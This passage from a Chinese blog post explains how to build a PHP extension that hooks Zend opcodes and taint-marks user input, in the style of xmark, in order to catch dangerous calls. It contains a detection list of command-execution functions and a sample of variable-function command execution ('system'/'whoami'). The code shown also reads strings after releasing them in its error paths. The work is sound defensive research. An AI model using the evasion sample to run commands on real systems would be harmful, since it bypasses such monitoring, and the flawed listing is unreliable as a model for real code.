class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zend_always_inline Bucket *<span class="title">rename_hash_key</span><span class="params">(HashTable *ht, zend_string *orig_name, zend_string *new_name, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    zend_ulong h;</span><br><span class="line">    <span class="keyword">uint32_t</span> nIndex;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx;</span><br><span class="line">    Bucket *p = <span class="literal">NULL</span>, *arData, *prev = <span class="literal">NULL</span>;</span><br><span class="line">    zend_bool found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    orig_name = zend_string_tolower(orig_name);</span><br><span class="line">    new_name = zend_string_tolower(new_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (zend_hash_exists(ht, new_name)) &#123;</span><br><span class="line">        zend_string_release(orig_name);</span><br><span class="line">        zend_string_release(new_name);</span><br><span class="line">        zend_error(E_ERROR, <span class="string">"function/class '%s' already exists"</span>, ZSTR_VAL(new_name));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h = zend_string_hash_val(orig_name);</span><br><span class="line">    arData = ht-&gt;arData;</span><br><span class="line">    nIndex = h | ht-&gt;nTableMask;</span><br><span class="line">    idx = HT_HASH_EX(arData, nIndex);</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(idx != HT_INVALID_IDX)) &#123;</span><br><span class="line">        prev = p;</span><br><span class="line">        p = HT_HASH_TO_BUCKET_EX(arData, idx);</span><br><span class="line">        <span class="keyword">if</span> (EXPECTED(p-&gt;key == orig_name)) &#123; <span class="comment">/* check for the same interned string */</span></span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EXPECTED(p-&gt;h == h) &amp;&amp;</span><br><span class="line">                   EXPECTED(p-&gt;key) &amp;&amp;</span><br><span class="line">                   EXPECTED(ZSTR_LEN(p-&gt;key) == ZSTR_LEN(orig_name)) &amp;&amp;</span><br><span class="line">                   EXPECTED(<span class="built_in">memcmp</span>(ZSTR_VAL(p-&gt;key), ZSTR_VAL(orig_name), ZSTR_LEN(orig_name)) == <span class="number">0</span>)) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        zend_string_release(orig_name);</span><br><span class="line">        zend_string_release(new_name);</span><br><span class="line">        zend_error(E_ERROR, <span class="string">"function/class '%s' does not exists"</span>, ZSTR_VAL(orig_name));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rehash</span></span><br><span class="line">    <span class="keyword">if</span> (!prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123;  <span class="comment">// only p</span></span><br><span class="line">        HT_HASH(ht, nIndex) = HT_INVALID_IDX;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123;  <span class="comment">// p in middle</span></span><br><span class="line">        Z_NEXT(prev-&gt;val) = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123;  <span class="comment">// p in tail</span></span><br><span class="line">        Z_NEXT(prev-&gt;val) = HT_INVALID_IDX;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123;  <span class="comment">// p in head</span></span><br><span class="line">        HT_HASH(ht, nIndex) = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zend_string_release(p-&gt;key);</span><br><span class="line">    p-&gt;key = zend_string_init_interned(ZSTR_VAL(new_name), ZSTR_LEN(new_name), <span class="number">1</span>);</span><br><span class="line">    p-&gt;h = h = zend_string_hash_val(p-&gt;key);</span><br><span class="line">    nIndex = h | ht-&gt;nTableMask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重命名函数名</span></span><br><span class="line">    <span class="keyword">if</span> (type == XMARK_IS_FUNCTION) &#123;</span><br><span class="line">        zend_string_release(p-&gt;val.value.func-&gt;common.function_name);</span><br><span class="line">        zend_string_addref(p-&gt;key);</span><br><span class="line">        p-&gt;val.value.func-&gt;common.function_name = p-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (HT_HASH(ht, nIndex) != HT_INVALID_IDX)</span><br><span class="line">        Z_NEXT(p-&gt;val) = HT_HASH(ht, nIndex);</span><br><span class="line"></span><br><span class="line">    HT_HASH(ht, nIndex) = idx;</span><br><span class="line"></span><br><span class="line">    zend_string_release(orig_name);</span><br><span class="line">    zend_string_release(new_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Hook-opcode"><a href="#Hook-opcode" class="headerlink" title="Hook opcode"></a>Hook opcode</h3><p>为什么要hook opcode呢？在后来的测试中发现像<code>echo</code>、<code>eval</code>这些，它是一个语言特性，而不是一个函数，在<code>EG(function_table)</code>这个记录所有PHP函数的哈希表中找不到，但是他们最终都要解析成opcode，所以可以通过这种方式来劫持函数。<br><img src="https://i.loli.net/2020/03/01/TCfVLrlEZjQIMwq.jpg" alt="-w893"></p><p>再举一个遇到的例子，比如在污点标记的时候，用户可控<code>$a</code>，但在后文经过字符串拼接<code>$b = &quot;xx&quot;.$a</code>，将恶意代码传递给<code>$b</code>变量，这个时候我们是没有办法在函数层面控制的标记的，这个时候通过处理<code>CONCAT</code>指令即可解决：<br><img src="https://i.loli.net/2020/03/01/M1dsVQHyBj5DmXE.jpg" alt="-w775"></p><h4 id="Demo-Hook-ZEND-ECHO"><a href="#Demo-Hook-ZEND-ECHO" class="headerlink" title="Demo: Hook ZEND_ECHO"></a>Demo: Hook ZEND_ECHO</h4><p>基础，php执行流程、全局变量等</p><p>这种方式要求我们知道函数所对应的opcode代码，可以通过gdb调试的办法查找，这里以echo为例，其opcode为<code>ZEND_ECHO</code>。<br><img src="https://i.loli.net/2020/03/01/6go7ZdYxjbPLvyT.jpg" alt="-w683"></p><p>在<code>passer6y.h</code>中添加定义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fake_echo(ZEND_OPCODE_HANDLER_ARGS);</span><br></pre></td></tr></table></figure></p><p>然后在<code>passer6y.c</code>中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int fake_echo(ZEND_OPCODE_HANDLER_ARGS)</span><br><span class="line">&#123;</span><br><span class="line">    php_printf(&quot;hook success&quot;);</span><br><span class="line">return ZEND_USER_OPCODE_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>并在模块初始化<code>PHP_MINIT_FUNCTION</code>函数中添加调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINIT_FUNCTION(passer6y)</span><br><span class="line">&#123;</span><br><span class="line">/* If you have INI entries, uncomment these lines</span><br><span class="line">REGISTER_INI_ENTRIES();</span><br><span class="line">*/</span><br><span class="line">//php_override_func(&quot;echo&quot;, sizeof(&quot;echo&quot;), PHP_FN(fake_echo), NULL TSRMLS_CC);</span><br><span class="line">zend_set_user_opcode_handler(ZEND_ECHO, fake_echo);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译运行：<br><img src="https://i.loli.net/2020/03/01/nwa7rRqF6Vj84pC.jpg" alt="-w873"></p><h4 id="敏感函数hook"><a href="#敏感函数hook" class="headerlink" title="敏感函数hook"></a>敏感函数hook</h4><ul><li>eval: INCLUDE_OR_EVAL<br><img src="https://i.loli.net/2020/03/01/F5u8AVzmEcbhPla.jpg" alt="-w691"><br>在<code>php-src-php-7.0.33/Zend/zend_ast.c#1258</code>还有其他几个也使用了相同的opcode:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ZEND_AST_INCLUDE_OR_EVAL:</span><br><span class="line"><span class="keyword">switch</span> (ast-&gt;attr) &#123;</span><br><span class="line"><span class="keyword">case</span> ZEND_INCLUDE_ONCE: FUNC_OP(<span class="string">"include_once"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_INCLUDE:      FUNC_OP(<span class="string">"include"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_REQUIRE_ONCE: FUNC_OP(<span class="string">"require_once"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_REQUIRE:      FUNC_OP(<span class="string">"require"</span>);</span><br><span class="line"><span class="keyword">case</span> ZEND_EVAL:         FUNC_OP(<span class="string">"eval"</span>);</span><br><span class="line">EMPTY_SWITCH_DEFAULT_CASE();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>显然，<code>include_once</code>、<code>include</code>、<code>require_once</code>、<code>require</code>、<code>eval</code>这5个函数的功能一样。</p><ul><li>system: DO_ICALL<br><img src="https://i.loli.net/2020/03/01/9G1gIbOK3scnj7e.jpg" alt="-w733"></li></ul><ul><li>变量函数执行：DO_FCALL<br><code>$a=&quot;system&quot;;$a(&quot;whoami&quot;);</code><br><img src="https://i.loli.net/2020/03/01/w5py7P49evcH6Uf.jpg" alt="-w755"></li></ul><p>总结一下，hook这几个opcode指令：</p><ul><li>INCLUDE_OR_EVAL</li><li>DO_ICALL</li><li>DO_FCALL</li></ul><h5 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h5><p><strong>opcode hook</strong><br>通过<code>zend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)</code>函数实现将指定的opcode，替换成我们自定义的。</p><p>其中<code>user_opcode_handler_t</code>类型是<code>zend_execute_data *execute_data</code>的别名：<br><img src="https://i.loli.net/2020/03/01/Vt56lUKN7h1f9cR.jpg" alt="-w1226"></p><blockquote><p>第一次见typedef的这种用法，参考这篇文章：<a href="http://c.biancheng.net/view/298.html" target="_blank" rel="noopener">http://c.biancheng.net/view/298.html</a></p></blockquote><p><code>zend_execute_data</code>结构的注解在文档中有解释：<a href="https://www.kancloud.cn/nickbai/php7/363280" target="_blank" rel="noopener">https://www.kancloud.cn/nickbai/php7/363280</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EX(element)             ((execute_data)-&gt;element)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//zend_compile.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> zend_op       *opline;  <span class="comment">//指向当前执行的opcode，初始时指向zend_op_array起始位置</span></span><br><span class="line">    zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">    zval                *return_value;  <span class="comment">//返回值指针</span></span><br><span class="line">    zend_function       *func;          <span class="comment">//当前执行的函数（非函数调用时为空）</span></span><br><span class="line">    zval                 This;          <span class="comment">//这个值并不仅仅是面向对象的this，还有另外两个值也通过这个记录：call_info + num_args，分别存在zval.u1.reserved、zval.u2.num_args</span></span><br><span class="line">    zend_class_entry    *called_scope;  <span class="comment">//当前call的类</span></span><br><span class="line">    zend_execute_data   *prev_execute_data; <span class="comment">//函数调用时指向调用位置作用空间</span></span><br><span class="line">    zend_array          *symbol_table; <span class="comment">//全局变量符号表</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_RUN_TIME_CACHE</span></span><br><span class="line">    <span class="keyword">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ZEND_EX_USE_LITERALS</span></span><br><span class="line">    zval                *literals;  <span class="comment">//字面量数组，与func.op_array-&gt;literals相同</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中第一个车管员<code>opline</code>的结构定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_op</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">void</span> *handler; <span class="comment">//对应执行的C语言function，即每条opcode都有一个C function处理</span></span><br><span class="line">    znode_op op1;   <span class="comment">//操作数1</span></span><br><span class="line">    znode_op op2;   <span class="comment">//操作数2</span></span><br><span class="line">    znode_op result; <span class="comment">//返回值</span></span><br><span class="line">    <span class="keyword">uint32_t</span> extended_value; </span><br><span class="line">    <span class="keyword">uint32_t</span> lineno; </span><br><span class="line">    zend_uchar opcode;  <span class="comment">//opcode指令</span></span><br><span class="line">    zend_uchar op1_type; <span class="comment">//操作数1类型</span></span><br><span class="line">    zend_uchar op2_type; <span class="comment">//操作数2类型</span></span><br><span class="line">    zend_uchar result_type; <span class="comment">//返回值类型</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>还有成员<code>func</code>的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> _zend_function &#123;</span><br><span class="line">    zend_uchar type;    <span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">        zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">        zend_string *function_name;</span><br><span class="line">        zend_class_entry *scope; <span class="comment">//成员方法所属类，面向对象实现中用到</span></span><br><span class="line">        <span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line">        <span class="keyword">uint32_t</span> num_args; <span class="comment">//参数数量</span></span><br><span class="line">        <span class="keyword">uint32_t</span> required_num_args; <span class="comment">//必传参数数量</span></span><br><span class="line">        zend_arg_info *arg_info; <span class="comment">//参数信息</span></span><br><span class="line">    &#125; common;</span><br><span class="line"></span><br><span class="line">    zend_op_array op_array; <span class="comment">//函数实际编译为普通的zend_op_array</span></span><br><span class="line">    zend_internal_function internal_function;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>现在我们要实现一个执行该opcode的函数以及参数的功能：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_do_fcall_handler</span><span class="params">(zend_execute_data *execute_data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> zend_op *opline = execute_data-&gt;opline;    </span><br><span class="line">zend_execute_data *call = execute_data-&gt;call;</span><br><span class="line">zend_function *fbc = call-&gt;func;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fbc-&gt;type == ZEND_INTERNAL_FUNCTION) &#123;</span><br><span class="line"><span class="comment">// 获取参数个数</span></span><br><span class="line"><span class="keyword">int</span> arg_count = ZEND_CALL_NUM_ARGS(call); </span><br><span class="line"><span class="keyword">if</span> (!arg_count) &#123;</span><br><span class="line"><span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果不在类中</span></span><br><span class="line"><span class="keyword">if</span> (fbc-&gt;common.scope == <span class="literal">NULL</span>)&#123;</span><br><span class="line">zend_string *fname = fbc-&gt;common.function_name;</span><br><span class="line"><span class="keyword">char</span> *funcname = ZSTR_VAL(fname);</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(funcname);</span><br><span class="line"><span class="keyword">if</span> (fname) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(<span class="string">"passthru"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"system"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"exec"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"shell_exec"</span>, funcname, len) == <span class="number">0</span></span><br><span class="line">|| <span class="built_in">strncmp</span>(<span class="string">"proc_open"</span>, funcname, len) == <span class="number">0</span> ) &#123;</span><br><span class="line">zend_error(E_WARNING, funcname);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">zend_error(E_WARNING, <span class="string">"ZEND_DO_FCALL Hook success"</span>);</span><br><span class="line">    <span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/53mNMeLuRc9P8Ij.jpg" alt="-w669"></p><p><strong>函数参数获取</strong><br>参考<a href="https://www.kancloud.cn/nickbai/php7/363323" target="_blank" rel="noopener">php7内核剖析</a>文章的函数参数解析部分，获取到第一个参数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">php_do_fcall_handler</span><span class="params">(zend_execute_data *execute_data)</span></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">zend_execute_data *call = execute_data-&gt;call;</span><br><span class="line">zval *arg = ZEND_CALL_ARG(call, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/nVsm84hZrGI3LMP.jpg" alt="-w658"></p><p><strong>格式化输出</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_warning</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fname, <span class="keyword">const</span> <span class="keyword">char</span> *arg, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> <span class="comment">/* &#123;&#123;&#123; */</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer, *msg;</span><br><span class="line">va_list args;</span><br><span class="line"><span class="comment">//EG(error_reporting) = 1;</span></span><br><span class="line">va_start(args, format);</span><br><span class="line">vspprintf(&amp;buffer, <span class="number">0</span>, format, args);</span><br><span class="line">spprintf(&amp;msg, <span class="number">0</span>, <span class="string">"%s(\"%s\"): %s"</span>, fname, arg, buffer);</span><br><span class="line">efree(buffer);</span><br><span class="line">zend_error(E_WARNING, msg);</span><br><span class="line">efree(msg);</span><br><span class="line">va_end(args);</span><br><span class="line">&#125; <span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//... php_do_fcall_handler()</span></span><br><span class="line">php_warning(funcname, ZSTR_VAL(Z_STR_P(arg)), <span class="string">"warning function"</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/01/e9vlZQR4nsoFN6g.jpg" alt="-w677"></p><p>接下来写一个循环遍历，获取全部参数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个数组，记录参数</span></span><br><span class="line">ZVAL_NEW_ARR(&amp;z_params);    </span><br><span class="line">zend_hash_init(Z_ARRVAL(z_params), arg_count, <span class="literal">NULL</span>, ZVAL_PTR_DTOR, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;arg_count; i++) &#123;</span><br><span class="line">zval *p = ZEND_CALL_ARG(call, i + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (Z_REFCOUNTED_P(p)) Z_ADDREF_P(p);</span><br><span class="line">zend_hash_next_index_insert(Z_ARRVAL(z_params), p);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>剩下几个opcode挖坑</p></blockquote><h2 id="污点标记"><a href="#污点标记" class="headerlink" title="污点标记"></a>污点标记</h2><p>继续参考fate0师傅的<a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark</a>项目，在扩展中通过<code>PHP_FUNCTION</code>来定义<code>xmark</code>函数，帮助我们标记字符串，传递一个字符串引用，返回是否标记成功。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(xmark)</span><br><span class="line">&#123;</span><br><span class="line">    zval *z_str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!XMARK_G(enable)) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取参数，第一个参数为接收参数的个数，ZEND_NUM_ARGS()为有多少要多少，z为zval类型，引用传参通过zend_parse_parameters只能用z，第三个为存储参数变量的指针</span></span><br><span class="line">    <span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">"z"</span>, &amp;z_str) == FAILURE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ZVAL_DEREF(z_str);     <span class="comment">// 在php-src-php-7.0.33/Zend/zend_types.h中定义，如果z_str是引用则找到其具体引用的zval</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 只能标记字符串，所以array和其他类型得先遍历一下</span></span><br><span class="line">    <span class="keyword">if</span> (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == <span class="number">0</span>) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (xmark_zstr(z_str) == FAILURE) &#123;</span><br><span class="line">        RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    RETURN_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中标记字符部分在<code>xmark_zstr</code>函数中处理：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zend_always_inline <span class="keyword">int</span> <span class="title">xmark_zstr</span><span class="params">(zval *z_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!XCHECK_FLAG(Z_STR_P(z_str))) &#123;</span><br><span class="line">        zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), <span class="number">0</span>);</span><br><span class="line">        ZSTR_LEN(str) = Z_STRLEN_P(z_str);</span><br><span class="line">        zend_string_release(Z_STR_P(z_str));    <span class="comment">// 释放z_str字符串</span></span><br><span class="line">        XMARK_FLAG(str);        <span class="comment">// 标记字符串</span></span><br><span class="line">        ZVAL_STR(z_str, str);       <span class="comment">// 标记完了后，将z_str的值设为str</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在具体的<code>XMARK_FLAG</code>和<code>XCHECK_FLAG</code>函数这样实现的，xmark/php_xmark.h#41<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PHP_VERSION_ID &lt; 70300</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> IS_XMARK_FLAG            (1&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XMARK_FLAG(str)          (GC_FLAGS((str)) |= IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCLEAR_FLAG(str)         (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> EX_CONSTANT(op)          RT_CONSTANT(EX(opline), op)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> IS_XMARK_FLAG            (1&lt;&lt;5)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XMARK_FLAG(str)          GC_ADD_FLAGS(str, IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCLEAR_FLAG(str)         GC_DEL_FLAGS(str, IS_XMARK_FLAG)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> XCHECK_FLAG(str)         (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)</span></span><br><span class="line"><span 